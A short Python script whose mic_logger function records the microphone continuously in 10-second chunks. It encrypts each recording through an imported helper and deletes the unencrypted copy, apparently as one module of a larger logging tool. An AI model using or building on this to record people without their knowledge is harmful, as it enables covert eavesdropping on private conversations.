import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
import os
import time
import uuid
from encryptor import encrypt_file

def mic_logger():
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    LOG_DIR = os.path.join(BASE_DIR, "logs")
    os.makedirs(LOG_DIR, exist_ok=True)
    duration = 10
    sample_rate = 44100

    try:
        while True:
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
            sd.wait()
            unique_id = uuid.uuid4().hex
            filename = os.path.join(LOG_DIR, f"{unique_id}.wav")
            write(filename, sample_rate, recording)
            encrypted_filename = f"{filename}.enc" # add encrypted file
            encrypt_file(filename, encrypted_filename) # encrypt function
            os.remove(filename)
            time.sleep(3)
    except KeyboardInterrupt:
        print("Mic logger stopped.")